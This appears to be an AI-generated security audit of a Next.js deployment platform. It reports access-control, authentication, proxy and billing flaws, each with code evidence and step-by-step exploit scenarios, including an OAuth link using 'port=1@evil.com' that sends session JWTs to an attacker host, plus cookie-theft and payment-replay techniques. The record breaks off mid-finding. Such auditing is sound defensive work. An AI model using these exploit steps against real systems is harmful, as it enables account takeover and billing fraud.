### 🟠 HIGH — GET /api/gcp/discover enumerates every tenant's database instances in the shared GCP project
- **Location:** `src/app/api/gcp/discover/route.ts:46`
- **Category:** `broken-object-level-authorization`
- **Failure scenario:** `discoverResources` (src/lib/gcp/discovery.ts:85-107) calls `https://sqladmin.googleapis.com/v1/projects/${targetProjectId}/instances` with the platform service-account token and pushes EVERY returned item into the response, with no filter tying results to the Deployify project passed in. Because every tenant's Cloud SQL/Memorystore/Firestore resource is provisioned into the same GCP project, an attacker who creates one project of their own and calls `GET /api/gcp/discover?projectId=<their project>` receives the instance name, region, state, databaseVersion and `connectionName` of every other customer's database. The optional `gcpProjectId` query param additionally lets the caller aim the platform SA at any GCP project it can read.
- **Impact:** Cross-tenant infrastructure inventory disclosure: customer names leak through instance names (they are the user-supplied connector name slugified), plus regions, engine versions and Cloud SQL connectionNames. It is also the reconnaissance step that makes the DELETE finding above trivially targetable instead of requiring guesswork.
- **Evidence:**

```ts
const gcpProjectId = searchParams.get('gcpProjectId'); // Optional: Target GCP Project ID
...
const access = await checkProjectAccess(session.user.id, projectId);
if (!access.allowed) { ... }
if (access.role === 'viewer') { ... }
// 2. Perform discovery (either for the project's default GCP project or an override)
const targetGcpProjectId = gcpProjectId || undefined;
...
const resources = await discoverResources(targetGcpProjectId, activePatterns, projectId);
```
- **Agent says it ruled out:** Read src/lib/gcp/discovery.ts lines 18-140: the `deployifyProjectId` argument is used only to fetch external provider API keys, never to filter the GCP result set; `activeBranchPatterns` only sets an `isOrphaned` flag, it does not exclude anything. Grepped the route for any post-filter on `resources` — there is none, the array is returned verbatim at line 48-51. The `access.role === 'viewer'` gate at line 30 does not help: the attacker is owner of their own project.

### 🟠 HIGH — /api/infrastructure/health and /api/infrastructure/compliance-report accept an arbitrary teamId with no membership check
- **Location:** `src/app/api/infrastructure/health/route.ts:23`
- **Category:** `broken-access-control`
- **Failure scenario:** Any authenticated Deployify user sends `GET /api/infrastructure/health?teamId=<victim team id>`. `listProjectsByTeam` (src/lib/db.ts:1078-1094) is a raw Firestore `where('teamId','==',teamId)` query with no caller scoping, so the response body returns the victim organisation's `projectHealth` map (project ids), and `regionalMappings[]` containing projectId, projectName, projectRegion, storageId, storageName, storageType and storageRegion for every connector they own, plus their aggregate cost, forecast and security-risk breakdown. The identical omission exists at src/app/api/infrastructure/compliance-report/route.ts:23, whose response is richer still: per-connector `connectorId`, `connectorName`, `type`, `environment`, security `score`, `grade`, and the full `risks` array from `checkSecurityPosture`.
- **Impact:** Cross-tenant disclosure of another organisation's full infrastructure inventory, monthly spend, and — via the compliance report — an itemised list of their unremediated security weaknesses (a ready-made attack plan against their databases).
- **Evidence:**

```ts
const { searchParams } = new URL(request.url);
const teamId = searchParams.get('teamId');

// 1. Fetch projects for the context
let projects: Project[] = [];
if (teamId) {
    projects = await listProjectsByTeam(teamId);
} else {
    projects = await listProjectsByUser(session.user.id);
}
```
- **Agent says it ruled out:** Both handlers were read end-to-end; neither imports nor calls `getTeamMembership`, `listTeamsForUser`, or `checkProjectAccess` (the health route's imports at line 3 are only `listProjectsByUser, listProjectsByTeam`). This is provably an omission rather than a design choice: the sibling POST /api/infrastructure/remediate/route.ts:26-31 performs exactly the missing check with the comment `// Security: Verify user is a member of the team`, and GET /api/projects/route.ts:29-39 does the same before calling `listProjectsByTeam`. src/proxy.ts adds no authorization.

### 🟠 HIGH — Public dashboard-widget query path never binds the widget to the storageId in the URL, nor restricts caller-supplied query variables
- **Location:** `src/app/api/projects/[id]/storage/[storageId]/query/route.ts:58`
- **Category:** `broken-object-level-authorization`
- **Failure scenario:** The widget document stores its own `storageId` (written at src/app/api/projects/[id]/storage/dashboards/route.ts:87) but the handler resolves the connector from the URL segment instead, and never compares the two. (1) Cross-connector: a project publishes widget W on its staging connector and a second public widget on its production connector — both storageIds are readable unauthenticated via GET /api/projects/[id]/storage/dashboards/[dashboardId]. An unauthenticated attacker POSTs `{"widgetId":"W"}` to `/api/projects/<id>/storage/<PRODUCTION-storageId>/query`, and W's saved query (e.g. `SELECT * FROM users LIMIT 500`) executes against the production database. (2) Variable tampering, no guessing required: line 28 destructures `variables` from the request body and lines 91-133 substitute them into the query on the public path too. A widget whose saved query is `SELECT * FROM invoices WHERE customer_id = :cid` becomes an arbitrary-row reader for any unauthenticated visitor who posts a different `cid`.
- **Impact:** Unauthenticated read of live customer database rows from connectors that were never shared publicly, and unauthenticated horizontal traversal of every row reachable by a published widget's parameterised query.
- **Evidence:**

```ts
if (widgetId) {
    // Public Widget Path: No session required, but must be a valid public widget
    const widgetDoc = await db.collection(Collections.PROJECTS).doc(id).collection('storage_dashboards').doc(widgetId).get();
    ...
    if (!widgetData?.isPublic) { return ... 403 }
    // Enforce the saved query for public access
    query = widgetData.query;
    ...
        const projectDoc = await db.collection(Collections.PROJECTS).doc(id).get();
        const projectData = projectDoc.data();
        storageConfig = projectData?.storageConfigs?.find((s: StorageConfig) => s.id === storageId);
```
- **Agent says it ruled out:** Checked the masking mitigation: `shouldMask = widgetId || access?.role === 'viewer'` (line 943) routes public results through `maskData` — but src/lib/utils/masking.ts only regex-redacts emails, phones, credit-card digits, SSNs and `*_token/_key/_secret` keys; all other columns (names, addresses, amounts, free text, internal ids, health data) are returned verbatim. Confirmed the read-only keyword filter at line 136-140 blocks writes but not reads. Confirmed no `widgetData.storageId === storageId` comparison exists anywhere in the file (grepped `widgetId` — hits only at 28, 35, 38, 943, 984, 1033). Confirmed the share page src/app/share/dashboard/[id]/page.tsx:79 supplies `widget.storageId` from the client, so the server is fully trusting a client-controlled path segment.

### 🟠 HIGH — Team invite tokens are readable by every member including viewers, and /api/invites/accept never binds the token to the invited email — viewer to owner escalation
- **Location:** `src/app/api/invites/accept/route.ts:44`
- **Category:** `privilege-escalation`
- **Failure scenario:** Step 1 — token disclosure: `GET /api/teams/[id]/invites` (src/app/api/teams/[id]/invites/route.ts:23-31) gates only on `getTeamMembership(id, session.user.id)` being non-null, so a `viewer` passes. It returns `listInvitesForTeam(id)`, which spreads the raw Firestore document (`return { ...data, createdAt, expiresAt } as TeamInvite`, src/lib/db.ts:661-666) — and `TeamInvite` includes `token: string` (src/types/index.ts:107). Step 2 — redemption: the attacker POSTs that token to /api/invites/accept. The handler compares nothing against `session.user.email`, and `acceptInvite` (src/lib/db.ts:718-749) unconditionally writes `{ teamId: invite.teamId, userId, role: invite.role }`. A viewer who sees a pending `owner` or `admin` invite addressed to someone else redeems it and is granted that role. `acceptInvite` also never checks for an existing membership, so it leaves the attacker with two membership rows for the same team.
- **Impact:** A read-only team member escalates to team owner/admin, gaining project deletion, credential rotation, secret reveal, member removal and billing control over the whole team; the legitimate invitee's invite is consumed and deleted, and the duplicate membership row makes the escalation hard to spot in the members list.
- **Evidence:**

```ts
const invite = await getInviteByToken(token);
if (!invite) { ... 404 }
if (invite.expiresAt < new Date()) { ... 410 }

await acceptInvite(invite.id, session.user.id);
```
- **Agent says it ruled out:** Read src/app/api/invites/accept/route.ts end-to-end — no `session.user.email` reference at all (grepped). Read src/lib/db.ts:718-749 `acceptInvite` — no email comparison, no existing-membership guard, no role clamp. Confirmed the invites listing has no role gate, unlike its siblings: src/app/api/teams/[id]/invite/route.ts:39 and src/app/api/teams/[id]/invites/[inviteId]/route.ts:24 both require `owner`/`admin`. Confirmed the token is high-entropy (`crypto.randomUUID()`, invite/route.ts:64) so guessing is not the vector — authenticated disclosure via the listing endpoint is.

### 🟠 HIGH — Cloud SQL backup restore, regional migration and schema migrations have no role gate — a viewer can overwrite production data
- **Location:** `src/app/api/projects/[id]/storage/[storageId]/backups/[backupId]/restore/route.ts:34`
- **Category:** `missing-role-enforcement`
- **Failure scenario:** A user holding the lowest role (`viewer`) on a team project — someone deliberately given read-only access, e.g. a contractor or auditor — POSTs to `/api/projects/<id>/storage/<storageId>/backups/<backupId>/restore`. `checkProjectAccess` returns `{allowed:true, role:'viewer'}` and the handler proceeds directly to `restoreBackup`, which issues a Cloud SQL `restoreBackup` call (src/lib/gcp/cloudsql.ts:402-416) that overwrites the live production instance with the backup's contents, discarding every write since that backup. Sending `backupId=pitr` with an arbitrary `pointInTime` body field does the same via point-in-time recovery. The same missing gate lets a viewer POST /migrate-region (src/app/api/projects/[id]/storage/[storageId]/migrate-region/route.ts:22-30, spins up a new instance and flips the connector to `provisioning`) and POST /migrations and /migrations/rollback (which run Prisma migrations against the production database).
- **Impact:** Destructive, hard-to-reverse data loss on a customer's production database triggered by a principal the customer explicitly restricted to read-only, plus unbudgeted infrastructure spend from viewer-initiated regional migrations.
- **Evidence:**

```ts
const access = await checkProjectAccess(session.user.id, id);
if (!access.allowed) return NextResponse.json({ success: false, error: access.error }, { status: access.status });
storageConfig = access.project?.storageConfigs?.find((s: StorageConfig) => s.id === storageId);
...
const operationName = backupId === 'pitr'
    ? await restoreBackup(instanceName, undefined, pointInTime)
    : await restoreBackup(instanceName, backupId);
```
- **Agent says it ruled out:** Grepped the restore, migrate-region, migrations and migrations/rollback route files for `access.role` / `role ===` — zero hits in any of them. This is inconsistent enforcement rather than an intentional model: eleven sibling storage routes explicitly reject viewers with the identical guard, e.g. src/app/api/projects/[id]/storage/[storageId]/rotate/route.ts:29, .../export/route.ts:30, .../import/route.ts:30, .../clone/route.ts:27, .../cutover/route.ts:23, and .../replica/promote/route.ts:27 requires owner/admin. Verified `checkProjectAccess` (src/middleware/rbac.ts) returns `allowed:true` for every membership row regardless of role, so it provides no implicit gate. src/proxy.ts adds none.

### 🟡 MEDIUM — Production traffic rollback and Cloud Run alias retargeting are open to viewers
- **Location:** `src/app/api/projects/[id]/deployments/[deployId]/rollback/route.ts:22`
- **Category:** `missing-role-enforcement`
- **Failure scenario:** A `viewer` on a team project POSTs to `/api/projects/<id>/deployments/<any old ready deployId>/rollback`. The only gate is `checkProjectAccess`, which returns allowed for viewers, so `updateTraffic` shifts 100% of the production Cloud Run service to a stale revision — reverting the live site to old code, potentially reintroducing a patched vulnerability. The same gap exists at src/app/api/projects/[id]/rollback/route.ts:26-33 (POST with an arbitrary `revisionName`) and at src/app/api/projects/[id]/deployments/[deployId]/alias/route.ts:24 / :97, where POST and DELETE let a viewer create or tear down Cloud Run traffic tags and, via `removeAliasFromOtherDeployments`, steal an alias such as `staging` or `canary` from the deployment that currently owns it.
- **Impact:** A read-only principal can cause a production outage or silently roll back a security fix, and can hijack or delete named preview aliases — all while the audit log records the action as an ordinary rollback rather than a privilege violation.
- **Evidence:**

```ts
const access = await checkProjectAccess(session.user.id, id);

if (!access.allowed) {
    return NextResponse.json({ error: access.error }, { status: access.status, headers: securityHeaders });
}

const { project } = access;

const targetDeployment = await getDeploymentById(deployId);
if (!targetDeployment || targetDeployment.projectId !== id) { ... }
...
await updateTraffic(serviceName, targetDeployment.cloudRunRevision, accessToken, project.region);
```
- **Agent says it ruled out:** Read all three route files end-to-end; grepped each for `role` — no occurrences. Confirmed these routes DO correctly bind the nested resource (`targetDeployment.projectId !== id` at line 31, and the same check in alias/route.ts:33 and :106), so the defect is specifically the missing role tier, not an IDOR. Confirmed the codebase treats deploy-class actions as viewer-forbidden elsewhere: src/app/api/projects/[id]/deploy/route.ts:44 and :321 both return 403 for `access.role === 'viewer'`, and src/app/api/projects/[id]/domains/route.ts:100 requires owner/admin — a rollback is a strictly more dangerous production mutation than a deploy.

### 🟡 MEDIUM — Any project member, including viewers, can flip a dashboard widget to isPublic and expose live database query results to the internet
- **Location:** `src/app/api/projects/[id]/storage/dashboards/[dashboardId]/route.ts:104`
- **Category:** `broken-access-control`
- **Failure scenario:** A `viewer` (or any `member`) on a project PATCHes `/api/projects/<id>/storage/dashboards/<dashboardId>` with `{"isPublic": true}`. No role check runs. `isPublic` is the sole authorization gate on two unauthenticated endpoints: the widget metadata GET in this same file (lines 41-51 skip `getSession`/`checkProjectAccess` entirely when `widget.isPublic`) and the public query path at src/app/api/projects/[id]/storage/[storageId]/query/route.ts:45-50. Once flipped, anyone with the widget id can retrieve the widget's `query` and `storageId` and execute that query against the live production connector with no session, refreshed on the widget's `refreshInterval`. The same route's DELETE (line 143) likewise lets a viewer permanently delete any of the team's dashboards.
- **Impact:** A read-only or low-trust team member converts an internal dashboard into a permanent unauthenticated data feed out of the production database, and can destroy other members' dashboards. Combined with the query-route binding gap above, the published widget also becomes a pivot to other connectors in the project.
- **Evidence:**

```ts
const access = await checkProjectAccess(session.user.id, id);

if (!access.allowed) {
    return NextResponse.json({ error: access.error }, { status: access.status });
}

const body = await request.json();
const { name, chartConfig, isPublic, refreshInterval } = body;
...
if (isPublic !== undefined) updateData.isPublic = isPublic;
...
await docRef.update(updateData);
```
- **Agent says it ruled out:** Read the file end-to-end; grepped for `role` — no occurrences in PATCH, DELETE or POST (src/app/api/projects/[id]/storage/dashboards/route.ts:69-93 also has no role gate on creation, so a viewer can create a public widget outright). Confirmed `checkProjectAccess` (src/middleware/rbac.ts) returns `allowed:true` for a viewer membership. Confirmed the unauthenticated read paths really are gated only on this boolean by reading dashboards/[dashboardId]/route.ts:41-51 and query/route.ts:35-50. Compared with src/app/api/projects/[id]/env/[envId]/reveal/route.ts:29, which blocks viewers from a far less consequential disclosure.

> **Coverage notes (D1):** Swept all 86 route handlers under src/app/api (find src/app/api -name route.ts) and built a full auth/authz matrix by grepping each for getSession/requireAuth, checkProjectAccess, getTeamMembership, and any access.role inspection, then read every route that scored a gap end-to-end.

Confirmed-clean areas (checked and deliberately NOT reported):
- Nested deployment resources: all three /deployments/[deployId]/* routes correctly enforce `deployment.projectId !== id` (alias:33 & :106, logs:33, rollback:31). No deployId IDOR.
- storageId as a nested resource is structurally safe: storageConfigs are an array embedded in the project document, so `access.project.storageConfigs.find(s => s.id === storageId)` cannot cross tenants. Verified in src/lib/db.ts (only storageId references are 134-183 in cloneStorageConfig).
- Saved queries bind to the caller: queries/[queryId]/route.ts:38 and :84 both check `doc.data()?.userId !== session.user.id`.
- Billing invoice download binds correctly (billing/invoices/[id]/download/route.ts:31 `invoice.userId !== session.user.id`).
- Team member management is thoroughly guarded: teams/[id]/members/[userId]/route.ts enforces owner/admin, admins-cannot-touch-owners, only-owners-promote-to-owner, and last-owner protection (lines 25, 45, 53, 115, 132, 140). teams/[id]/invites/[inviteId]/route.ts:40 verifies `invite.teamId !== teamId`.
- Storage clone already fixed the target-project BOLA (clone/route.ts:36-48, including a viewer check on the target).
- GET /api/projects:29-39 and POST /api/infrastructure/remediate:26-31 both verify team membership before listProjectsByTeam — these are the correct-pattern references I used to prove the infrastructure/health and compliance-report omissions are bugs, not design.
- /api/cron/optimize:37-42 fails closed in production (returns 401 when CRON_SECRET is unset or mismatched unless NODE_ENV!=='production' AND MOCK_DB==='true'), so I did not report it.
- Deliberately excluded as refutable: the `process.env.MOCK_DB === 'true'` authorization short-circuits in restore/route.ts:22, migrations/route.ts:23, migrations/rollback/route.ts:26, query/route.ts:53 and the dashboards routes. They bypass checkProjectAccess entirely, but only when an env var no production deployment sets is enabled, so they are a test-hook code smell rather than an exploitable finding.
- Also excluded: v1/analytics/[id]/realtime:23 uses `project.userId === session.user.id` in addition to team membership, so a project's original creator keeps access after transfer to a team — a divergence from checkProjectAccess semantics, but too weak/theoretical to report.

Not covered (out of scope for this dimension or not reachable by static review): SQL/NoSQL injection in the query proxy's non-SQL variable substitution path (query/route.ts:123-132 does raw string replacement for Mongo/Redis — flagged here only as a pointer for the injection reviewer), the public analytics ingest /api/v1/collect, /api/v1/proxy/[slug], /api/webhooks/github signature verification, /api/billing/webhook signature verification, and crypto/secret-management correctness in src/lib/crypto.ts. Firestore security rules were not reviewed (all access here is via firebase-admin, which bypasses rules, so server-side checks are the only control).


## D2. Authorization / broken access control / IDOR  <sub>`authz-idor`</sub>

### 🔴 CRITICAL — OAuth callback CLI branch redirects the session JWT to an attacker-controlled host (unvalidated `port` -> URL userinfo injection)
- **Location:** `src/app/api/auth/callback/route.ts:76`
- **Category:** `broken-authentication`
- **Failure scenario:** `port` is taken verbatim from the query string of GET /api/auth/github (src/app/api/auth/github/route.ts:10), stored in the `deployify_cli_context` cookie, and interpolated straight into a redirect URL. Because `port` is never validated as numeric, a value containing `@` moves the real host out of the `localhost` prefix: I confirmed in node that `new URL('http://localhost:1@evil.com/callback?token=SECRET')` yields `hostname = evil.com` (`localhost` becomes the userinfo). Exploit: attacker sends a victim who is already logged into GitHub a link to `https://<app>/api/auth/github?cli=true&port=1@evil.com`. That request itself mints the `oauth_state` cookie, so the CSRF state check at callback line 37 passes. GitHub auto-approves (the app is already authorized), the callback mints a real 7-day session JWT for the victim, and line 77 302s the victim's browser to `http://localhost:1@evil.com/callback?token=<victim JWT>`. The attacker's server reads the token from the query string.
- **Impact:** Full account takeover from a single link click. The stolen JWT is a complete 7-day session for the victim AND embeds their GitHub OAuth access token with `repo read:user user:email` scope (src/lib/auth.ts:29, src/lib/auth.ts:176), so the attacker also gets read/write access to all of the victim's private GitHub repositories. There is no revocation mechanism (see separate finding), so the token stays valid for 7 days even after the victim logs out.
- **Evidence:**

```ts
src/app/api/auth/callback/route.ts:69-84
        // Check for CLI context
        const cliContextCookie = cookieStore.get('deployify_cli_context');
        if (cliContextCookie) {
            try {
                const context = JSON.parse(cliContextCookie.value);
                if (context.cli && context.port) {
                    // Redirect to CLI local server with token
                    const redirectUrl = `http://localhost:${context.port}/callback?token=${sessionToken}`;
                    const response = NextResponse.redirect(redirectUrl);

src/app/api/auth/github/route.ts:9-10, 26-33
        const cli = searchParams.get('cli') === 'true';
        const port = searchParams.get('port');
        ...
        if (cli && port) {
            cookieStore.set('deployify_cli_context', JSON.stringify({ cli, port }), {
```
- **Agent says it ruled out:** Grepped both auth routes for any port validation (`rg -n "port" src/app/api/auth/github/route.ts src/app/api/auth/callback/route.ts`) and for helpers (`isValidPort|parseInt\(port|/^\\d`) in src/lib/utils.ts and src/lib/security — zero hits. Confirmed the CSRF `state` check at callback route lines 33-41 does NOT mitigate this, because the attacker-supplied URL is what generates the state cookie in the first place. Verified `new URL(...)` userinfo parsing empirically with node.

### 🔴 CRITICAL — Public reverse proxy forwards the browser's `Cookie` header (including `deployify_session`) to tenant-controlled Cloud Run origins
- **Location:** `src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:124`
- **Category:** `session-token-leak`
- **Failure scenario:** Only `host` and `connection` are stripped; `cookie` is forwarded. The route is reachable directly on the platform's own apex origin at `https://<app>/api/v1/proxy/<slug>/<path>` — src/proxy.ts treats the apex as `isBaseDomain` (line 75), skips the subdomain rewrite, and falls through to `NextResponse.next()` with no auth gate for `/api/**`. The session cookie is host-only for the apex with `path: '/'` (src/lib/auth.ts:117-123), so it IS sent on that path. Exploit: attacker signs up, creates a project (slug is derived from their own project name, src/app/api/projects/route.ts:118-120) and deploys an app whose handler logs inbound headers. They then get a logged-in Deployify user to make one top-level navigation to `https://<app>/api/v1/proxy/attacker-slug/anything` (SameSite=Lax permits cookies on top-level GET navigations, and any in-app link is same-site anyway). handleProxyRequest fetches `project.productionUrl` with the victim's `Cookie: deployify_session=<victim JWT>` header attached.
- **Impact:** Any Deployify user can harvest other users' full session JWTs — and therefore their embedded GitHub `repo`-scope OAuth tokens — with no privileged position, just a deployed app on the platform. There is no allowlist on which headers cross the trust boundary and no authentication on the proxy endpoint.
- **Evidence:**

```ts
src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:122-132
        // Forward relevant headers
        req.headers.forEach((value, key) => {
            if (!['host', 'connection'].includes(key.toLowerCase())) {
                headers.set(key, value);
            }
        });

        // Ensure proper forwarded headers
        headers.set('X-Forwarded-Host', req.headers.get('host') || '');
        headers.set('X-Forwarded-Proto', req.headers.get('x-forwarded-proto') || 'https');
```
- **Agent says it ruled out:** Read the whole route file end to end: there is no `headers.delete('cookie')`, no `getSession`/`requireAuth`/`checkProjectAccess` call, and no origin check. Checked src/proxy.ts lines 114-178: the dashboard auth gate only covers `/dashboard` and `/new`, and `/api/v1/proxy/...` on the apex only hits the in-memory rate limiter. Verified the session cookie's `path: '/'` scope at src/lib/auth.ts:121 so it is transmitted to this path.

### 🟠 HIGH — Reverse proxy copies `Set-Cookie` from tenant apps back onto the platform origin, enabling session fixation
- **Location:** `src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:170`
- **Category:** `session-fixation`
- **Failure scenario:** `set-cookie` is not in `skipHeaders`, so a response header chosen by the tenant's app is re-emitted by the platform on the platform's own origin. Exploit: attacker deploys an app that answers every request with `Set-Cookie: deployify_session=<attacker's own valid JWT>; Path=/; Max-Age=604800`. They lure a victim to `https://<app>/api/v1/proxy/attacker-slug/x`. The response overwrites the victim's cookie (same name, same host-only domain, same `path=/`, per src/lib/auth.ts:117-123). The victim continues using the dashboard while silently authenticated as the attacker, so every repo they connect, project they create, and environment variable/secret they paste lands in the attacker's account. A variant of the same primitive sets `deployify_session=%`, which makes `decodeURIComponent(cookieStore.get(COOKIE_NAME)?.value || '')` at src/lib/auth.ts:90 throw URIError on every request — a persistent 500 for that victim until they manually clear cookies.
- **Impact:** Attacker-controlled session fixation on the platform origin: victim's work and secrets are funnelled into the attacker's account, or the victim is permanently locked out via an unparseable cookie. Also lets any tenant set arbitrary cookies (and other response headers such as CSP or Access-Control-Allow-Origin) on the platform's own domain.
- **Evidence:**

```ts
src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:168-175
        // Copy allowed headers from target response
        const skipHeaders = ['content-encoding', 'content-length', 'transfer-encoding', 'connection', 'x-frame-options'];
        targetResponse.headers.forEach((value, key) => {
            if (!skipHeaders.includes(key.toLowerCase())) {
                responseHeaders.set(key, value);
            }
        });
```
- **Agent says it ruled out:** Read the full response-forwarding block; `set-cookie` is absent from `skipHeaders` and nothing else in the file filters it. Confirmed src/lib/auth.ts:90 wraps the cookie value in a bare `decodeURIComponent` with no try/catch, and that `getSession` is called from src/app/dashboard/layout.tsx:19 and 105 API routes, so the throw is not contained.

### 🟠 HIGH — Full Session object — including the GitHub `repo`-scope OAuth access token — is serialized into the RSC payload of every dashboard page
- **Location:** `src/app/dashboard/layout.tsx:38`
- **Category:** `sensitive-data-exposure`
- **Failure scenario:** `DashboardSidebar` is a Client Component, so Next.js App Router serializes every prop passed to it into the RSC flight payload that is inlined in the HTML response (`self.__next_f.push(...)`). The whole `Session` is passed, not just the display fields the sidebar actually reads (`session.user.avatarUrl`, `.githubUsername`, `.name`, `.subscription.tier` at lines 222-237). `Session.accessToken` is the raw GitHub OAuth token minted at src/app/api/auth/callback/route.ts:44 with scope `repo read:user user:email` (src/lib/auth.ts:176). The layout is `export const dynamic = 'force-dynamic'`, so this happens on every dashboard render. Concretely: any XSS anywhere in the dashboard, any malicious browser extension with content-script access, or any HTML-caching intermediary can read the token out of the page body — the httpOnly cookie protection is completely bypassed, because the token is in the document, not just the cookie.
- **Impact:** Defeats the entire point of storing the session in an httpOnly cookie for the most sensitive credential in the system: a GitHub token that can read and write all of the user's private repositories. Any low-severity DOM XSS in the dashboard escalates straight to GitHub repo compromise.
- **Evidence:**

```ts
src/app/dashboard/layout.tsx:19, 38
    const session = await getSession();
    ...
                <DashboardSidebar session={session} />

src/components/DashboardSidebar.tsx:1, 31-34
'use client';
...
interface DashboardSidebarProps {
    session: Session;
}
export function DashboardSidebar({ session }: DashboardSidebarProps) {

src/types/index.ts:366-370
export interface Session {
    user: User;
    accessToken: string;
    expiresAt: number;
}
```
- **Agent says it ruled out:** Checked next.config.ts for `experimental.taint` / `taintObjectReference` — not enabled (only `serverActions.bodySizeLimit` is set). Grepped for a sanitized/trimmed session shape being constructed before the prop is passed — there is none; `getSession()`'s return value goes straight through. Confirmed DashboardSidebar carries the `'use client'` directive on line 1, so this is a server->client prop boundary, and confirmed it only ever reads `session.user.*`, so the `accessToken` is being shipped for no functional reason.

### 🟠 HIGH — /api/billing/verify trusts a client-supplied `tierId` that the Razorpay signature does not cover, then mints a new session JWT with the escalated tier
- **Location:** `src/app/api/billing/verify/route.ts:29`
- **Category:** `privilege-escalation`
- **Failure scenario:** The HMAC covers only `orderId + '|' + paymentId`. `tierId` is read from the request body and never cross-checked against the order — the server never re-fetches the order from Razorpay to compare `notes.tierId` or `amount`, even though /api/billing/checkout does stamp them (src/app/api/billing/checkout/route.ts:76-81, `{ userId: user.id, tierId: tier.id }`). Exploit: user starts a legitimate checkout for the cheapest paid tier, `pro` at 1500 INR (src/lib/billing/tiers.ts:44-45), pays it, and Razorpay hands the browser a genuine `razorpay_order_id`/`razorpay_payment_id`/`razorpay_signature`. Instead of letting the page post them (src/app/billing/page.tsx:137-145), the user replays the same three values to POST /api/billing/verify with `tierId: "enterprise"` (15000 INR, src/lib/billing/tiers.ts:68-69). The signature validates, the subscription is written as enterprise, and a fresh session JWT is minted carrying `subscription.tier = 'enterprise'`. The same triple can also be replayed indefinitely — nothing marks an order as consumed — each replay pushing `currentPeriodEnd` another 30 days.
- **Impact:** 10x billing fraud (pay for pro, receive enterprise) plus unlimited free renewal by replaying one payment. The escalated tier is persisted to Firestore and therefore enforced by the real quota path (src/lib/billing/caps.ts:38-40 `getTier(user.subscription?.tier)` used by src/app/api/projects/[id]/deploy/route.ts), so it is not merely a cosmetic badge.
- **Evidence:**

```ts
src/app/api/billing/verify/route.ts:19, 29, 39-61
        const { orderId, paymentId, signature, tierId } = body;
        ...
        const isValid = verifyPaymentSignature(orderId, paymentId, signature);
        ...
        const updatedSubscription = {
            tier: tierId as 'free' | 'pro' | 'team' | 'enterprise',
            status: 'active' as const,
            ...
        };
        await updateUser(session.user.id, { subscription: updatedSubscription });
        const { createSessionToken, setSessionCookie } = await import('@/lib/auth');
        const newToken = await createSessionToken(updatedUser, session.accessToken);
        await setSessionCookie(newToken);

src/lib/billing/payments.ts:59-62
    const hmac = crypto.createHmac('sha256', secret);
    hmac.update(orderId + '|' + paymentId);
    const generatedSignature = hmac.digest('hex');
    return generatedSignature ===
… (truncated)
```
- **Agent says it ruled out:** Read src/lib/billing/payments.ts:47-62 in full — `verifyPaymentSignature` is correctly fail-closed on a missing secret, but its input genuinely excludes `tierId` and the amount. Grepped the verify route for any `getRazorpay().orders.fetch`, order-to-user binding, or replay/idempotency guard — none exists. Confirmed src/app/api/billing/checkout/route.ts computes the amount server-side from TIERS, which is precisely the binding that verify then throws away.

### 🟡 MEDIUM — `MOCK_DB=true` alone grants an unauthenticated enterprise admin session in any environment, with no production guard
- **Location:** `src/lib/auth.ts:99`
- **Category:** `auth-bypass`
- **Failure scenario:** The `MOCK_DB === 'true'` disjunct is evaluated independently of NODE_ENV, so it is honoured in a production container. The Dockerfile pins `ENV NODE_ENV=production`, but Cloud Run env vars are set at deploy time and override nothing about this check. If `MOCK_DB=true` is ever present on a deployed revision — copied from a staging service YAML, a `gcloud run deploy --set-env-vars` carried over from a debugging session, or an .env file baked into an image — then every anonymous request to the production URL is served as the `audit-test` enterprise user: src/proxy.ts:165 waves the request past the /dashboard gate and src/lib/auth.ts:99 returns MOCK_SESSION to all 105 `getSession()` call sites, i.e. full unauthenticated access to the dashboard, projects, storage credentials and billing APIs. The same flag simultaneously disables real checks across ~40 other modules (src/lib/gcp/iam.ts, src/lib/gcp/cloudsql.ts, src/lib/firebase.ts, src/app/api/billing/checkout/route.ts:19), so the failure is silent — the app looks healthy rather than erroring out.
- **Impact:** A single stray environment variable converts the platform from authenticated to fully open, with no fail-safe. Every other production-sensitive switch in the file is gated on NODE_ENV (lines 93, 131), so this one is an outlier and is easy to miss in a deploy review.
- **Evidence:**

```ts
src/lib/auth.ts:97-103
    if (!token) {
        // Fallback for local development if no session exists
        if (process.env.NODE_ENV === 'development' || process.env.MOCK_DB === 'true') {
            return MOCK_SESSION;
        }
        return null;
    }

src/lib/auth.ts:64-77 (MOCK_USER)
    id: 'audit-test',
    ...
    subscription: { tier: 'enterprise', ... }

src/proxy.ts:164-167
            // Bypass for local development
            if (process.env.NODE_ENV === 'development' || process.env.MOCK_DB === 'true') {
                return response;
            }
```
- **Agent says it ruled out:** Swept the repo for any production guard on this flag: `rg -n "MOCK_DB"` returns ~60 hits and not one of them is combined with a `NODE_ENV === 'production'` refusal. Confirmed the Dockerfile sets NODE_ENV=production (so the `development` disjunct is safe in the shipped image) and that no committed deploy manifest currently sets MOCK_DB — the defect is the missing guard, not a present misconfiguration.

### 🟡 MEDIUM — No session revocation whatsoever: a 7-day JWT cannot be invalidated, and logout is purely client-side
- **Location:** `src/lib/auth.ts:43`
- **Category:** `broken-authentication`
- **Failure scenario:** `createSessionToken` (src/lib/auth.ts:15-38) emits no `jti`, no session id, and no user token-version claim, and `verifySessionToken` consults nothing but the signature and the embedded `expiresAt` — there is no denylist, no Firestore session collection, and no per-user token epoch anywhere in the repo. `POST /api/auth/logout` only calls `clearSessionCookie()`, which deletes the browser cookie; the JWT itself stays valid for its full 7 days. Concretely: a user realises their token leaked (via any of the exfiltration paths above, or from `~/.deployify.json`, which the CLI writes with default 0644 permissions at src/cli/index.js:109 and which contains the same JWT in plaintext). They log out, they rotate their GitHub password, they revoke the OAuth app — none of it helps. The only remediation available to an operator is rotating `JWT_SECRET`, which signs out every user on the platform simultaneously.
- **Impact:** Turns every token-disclosure bug into a guaranteed 7-day compromise window with no containment option, and makes 'sign out of all devices', per-session audit, and incident response impossible. The blast radius is amplified because the token also carries the GitHub `repo`-scope access token in its payload (src/lib/auth.ts:29), and a JWT is signed but not encrypted, so anyone holding it can also just base64-decode the GitHub token out of it.
- **Evidence:**

```ts
src/lib/auth.ts:43-62
export async function verifySessionToken(token: string): Promise<Session | null> {
    try {
        const { payload } = await jwtVerify(token, getSecret(), { algorithms: [JWT_ALGORITHM] });
        ...
        return { user: payload.user as User, accessToken: payload.accessToken as string, ... };

src/lib/auth.ts:129-137 (clearSessionCookie)
    } else {
